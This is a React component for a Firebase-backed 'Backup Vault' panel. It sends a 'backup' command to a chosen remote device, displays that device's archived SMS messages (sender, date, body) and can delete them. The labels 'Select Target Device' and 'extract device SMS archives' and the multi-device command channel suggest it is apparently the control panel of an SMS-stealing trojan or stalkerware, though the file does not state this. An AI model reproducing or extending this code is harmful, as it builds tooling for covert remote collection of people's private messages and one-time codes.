"use client";
import React, { useState } from "react";
import { ref, update, remove } from "firebase/database";
import { db } from "../lib/firebase";

export default function BackupPanel({ data, showToast }) {
  const [selectedDevice, setSelectedDevice] = useState("");
  const devices = data.user_data || {};
  const backupSms = data.backup_sms || {};

  const handleBackupNow = () => {
    if (!selectedDevice) return showToast("Select a device first!", "warning");
    update(ref(db, `user_data/${selectedDevice}`), {
      command: "backup",
      timestamp: Date.now()
    }).then(() => showToast(`Backup command triggered for ${selectedDevice}`, "success"));
  };

  const handleClearBackup = () => {
    if (!selectedDevice) return showToast("Select a device first!", "warning");
    if (!confirm(`Clear backup for ${selectedDevice}?`)) return;
    remove(ref(db, `backup_sms/${selectedDevice}`)).then(() => showToast("Backup cleared", "success"));
  };

  const deviceBackupList = selectedDevice ? Object.values(backupSms[selectedDevice] || {}) : [];

  return (
    <div className="panel active">
      <div className="panel-header">
        <div>
          <h2><i className="fas fa-database" style={{ color: "var(--gold)" }}></i> Backup Vault</h2>
          <p className="panel-sub">Manage and extract device SMS archives</p>
        </div>
      </div>

      <div style={{ display: "grid", gridTemplateColumns: "1fr", gap: 12, marginBottom: 16 }}>
        <div>
          <label style={{ fontSize: 12, color: "var(--text-secondary)", fontWeight: 600, marginBottom: 6, display: "block" }}>
            Select Target Device
          </label>
          <select 
            className="luxury-select" 
            value={selectedDevice} 
            onChange={(e) => setSelectedDevice(e.target.value)}
          >
            <option value="">— Select a Device —</option>
            {Object.keys(devices).map(id => (
              <option key={id} value={id}>{id} ({devices[id].d_name || "Device"})</option>
            ))}
          </select>
        </div>

        <div style={{ background: "#f8fafc", border: "1px solid var(--border-color)", borderRadius: "var(--radius-sm)", padding: 12, display: "flex", gap: 16 }}>
          <div style={{ fontSize: 12, color: "var(--text-secondary)" }}>
            Selected: <strong style={{ color: "var(--text-primary)" }}>{selectedDevice || "None"}</strong>
          </div>
          <div style={{ fontSize: 12, color: "var(--text-secondary)" }}>
            Total Backups: <strong style={{ color: "var(--text-primary)" }}>{deviceBackupList.length}</strong>
          </div>
        </div>
      </div>

      <div style={{ display: "flex", gap: 8, marginBottom: 20 }}>
        <button className="btn-luxury btn-purple" onClick={handleBackupNow}>
          <i className="fas fa-play"></i> Backup Now
        </button>
        <button className="btn-luxury btn-red" onClick={handleClearBackup}>
          <i className="fas fa-trash"></i> Clear Backup
        </button>
      </div>

      <div>
        <h4 style={{ fontSize: 13, fontWeight: 700, color: "var(--text-primary)", marginBottom: 8 }}>
          Archived Messages
        </h4>
        <div style={{ display: "flex", flexDirection: "column", gap: 8 }}>
          {deviceBackupList.map((msg, i) => (
            <div key={i} style={{ background: "#ffffff", border: "1px solid var(--border-color)", borderRadius: "var(--radius-sm)", padding: 10, borderLeft: "3px solid var(--purple)" }}>
              <div style={{ display: "flex", justifyContent: "space-between", fontSize: 11, marginBottom: 4 }}>
                <span style={{ fontWeight: 700, color: "var(--text-primary)" }}>👤 {msg.sender || msg.address || "Unknown"}</span>
                <span style={{ color: "var(--text-muted)", fontSize: 10 }}>{msg.date || ""}</span>
              </div>
              <div style={{ fontSize: 12, color: "var(--text-primary)", whiteSpace: "pre-wrap" }}>{msg.body}</div>
            </div>
          ))}
          {deviceBackupList.length === 0 && <div className="empty-luxury">No backup items found for this device.</div>}
        </div>
      </div>
    </div>
  );
}
